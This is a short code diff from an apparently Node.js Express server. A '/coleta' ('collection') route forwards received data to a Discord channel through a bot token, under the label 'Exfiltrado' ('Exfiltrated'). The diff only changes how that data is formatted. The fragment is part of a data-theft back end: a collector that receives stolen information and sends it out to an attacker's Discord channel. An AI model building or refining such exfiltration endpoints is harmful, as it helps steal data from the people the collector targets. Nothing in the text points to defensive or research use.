@@ -215,7 +215,7 @@ app.post('/coleta', async (req, res) => {
       'Authorization': `Bot ${process.env.DC_BotToken}`,
       'Content-Type': 'application/json'
     },
-    body: JSON.stringify({ content: `Exfiltrado: \n \`\`\`\n${data}\`\`\`` })
+    body: JSON.stringify({ content: `Exfiltrado: \n \`\`\`\n${JSON.stringify(data, null, 4)}\`\`\`` })
   });
 
   res.status(204).end();
